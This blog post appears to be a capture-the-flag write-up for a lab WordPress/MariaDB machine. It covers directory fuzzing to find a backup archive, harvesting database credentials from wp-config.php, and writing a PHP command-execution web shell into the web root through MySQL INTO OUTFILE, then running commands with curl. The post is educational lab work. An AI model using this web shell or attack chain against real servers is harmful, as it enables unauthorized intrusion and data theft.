---
layout: post
title: PwnTillDawn - Margheriti Server Write-Up
date: 2026-11-16
classes: wide
description: Turning an open directory listing and an old backup into a database, a web shell and an admin password

---

Margheriti-Server (10.150.150.145)

## Scanning Phase

Three services, and the middle one owns the machine:

```sh
nmap -sV -sC -p22,80,3306 -Pn -oN scans/nmap.txt 10.150.150.145
```

```text
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
3306/tcp open  mysql   MariaDB 5.5.5-10.1.26
```

WordPress 4.9.12 on Debian 9, with the database port exposed to the network. That `3306` is the interesting line here, not the web application.

## The flag in the uploads folder

wpscan fingerprints the usual: version 4.9.12, XML-RPC enabled, akismet as the only plugin, and a single user, `eadmin`, found through author ID enumeration.

```sh
wpscan --url http://10.150.150.145/ -e vp,vt,u
```

It also reports something I did not expect to matter that early:

```text
[+] Upload directory has listing enabled: http://10.150.150.145/wp-content/uploads/
```

An open uploads folder is a file listing, and a file listing is a flag that needs no exploit. `FLAG22` was sitting there as `FLAG22.txt` (`723d1a71...`). Submitting it to the platform returned the machine name and the list of five flags this box carries.

## Directory brute force needs extensions

`ffuf` with `common.txt` returns `wp-admin`, `wp-content`, `wp-includes`, `xmlrpc.php` and an empty `conf/`. Nothing to attack — and the scan was wrong, not the target: `http://IP/FUZZ` replaces the whole name, so every request tested a path with no dot in it.

```sh
ffuf -u http://10.150.150.145/FUZZ -e .php,.html,.zip,.bkp,.db -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 403
```

```text
backup.zip   [Status: 200, Size: 10187627, Words: 0, Lines: 0]
```

Ten megabytes at the web root. Inside: the site, `FLAG14` (`e804bb2c...`) under `var/`, and the file every WordPress installation keeps its secrets in.

> 💡 **Quick Tip:** an extension-less fuzz is half a scan. `-e` is what turns "does this path exist" into "does this file exist", and config archives and backups are exactly the files that only exist with an extension.

## A table named FLAG32

`wp-config.php` from the backup holds the database account:

```text
define('DB_NAME', 'wordpress');
define('DB_USER', 'wpmaster');
define('DB_PASSWORD', '-!UlTr4S3cUr3P455W0rd-!');
```

```sh
mysql -h 10.150.150.145 -u wpmaster -p'-!UlTr4S3cUr3P455W0rd-!' wordpress
```

```sql
show tables;
```

```text
FLAG32_a4098775...
```

The flag is not in the table. It is the table's name — the same shape as a flag hidden in a DNS query label: the data is the identifier, and `select *` would never have shown it.

## From MySQL to a web shell

`wpmaster` has `FILE` on `*.*`, which means the server writes files on our behalf, as the `mysql` user. The web root is writable, so the database becomes an upload primitive. One line of PHP does the job:

```sql
select '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' into outfile '/var/www/html/sh.php';
```

```sh
curl -s 'http://10.150.150.145/sh.php?cmd=id'
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> ⚠️ **Important Note:** `INTO OUTFILE` writes through MySQL's escaped text format: NUL, tab, newline, carriage return and backslash come out escaped. My payload is a single line with no backslash, so nothing in it is touched — which is exactly why the simple shell survived. A multi-line script would arrive with every newline mangled; for that the route is `INTO DUMPFILE` (raw bytes, single row) fed with a hex literal, which also solves the quoting problem of embedding a whole file inside SQL.

And MySQL's file write is only as good as the user it runs as. `mysqld` runs as `mysql`, so this is a lateral step, not escalation. It lands in the web root here only because that directory is world-writable.

## The password was written down

The first listing I ran as `www-data` turned up a note: `WordPress-Account.txt`, with the administrator password in plain text.

Before that I had pulled `wp_users` from the database and tried to crack the `eadmin` phpass hash. It did not fall to a dictionary, and that was the answer rather than an obstacle: the password was random, and the box never needed it cracked — it needed it found.

Logging in gave the last WordPress-side flag, `FLAG23` (`8ea0d06e...`).

## The fifth flag

`FLAG6` lives in `/home/webmaster/`, and here is the honest part: it does not require root. It is readable by any local user, so `www-data` reads it (`63404274...`).

Root itself stayed open, and this is where I stopped. SUID and SGID are stock Debian, there are no capabilities, `sudo -l` is empty for `www-data`, cron is root-owned, and the database user has no `INSERT` on `mysql.*` for a UDF. The only vertical on the box is `webmaster`, who belongs to the `sudo` group — and that is a password the flags never needed.

## Lessons Learned

- Extension is half of a directory scan. `ffuf` with no `-e` tests paths and never files; the archive that handed me the database was invisible to 4.7k requests.
- A backup is a second copy of the machine's secrets, dated. `wp-config.php` inside an archive gave up a live database account.
- Flags do not have to be content: this one was a table name. List identifiers before reading rows.
- A hash that resists the dictionary is information, not a wall. The plaintext was in a text file on the same host. When cracking stops paying, look for where a human would have written the password down.
- `INTO OUTFILE` keeps a one-line payload intact because it only escapes newlines, tabs and backslashes — a multi-line script arrives mangled, and that is the case for `INTO DUMPFILE` with a hex literal.
- Know which principal your primitive runs as before calling it escalation: MySQL `FILE` writes as `mysql`, not as root.
- Five flags, five layers — a listing, an archive, a database, a panel, a home directory. One flag per door you open.

Hack on!
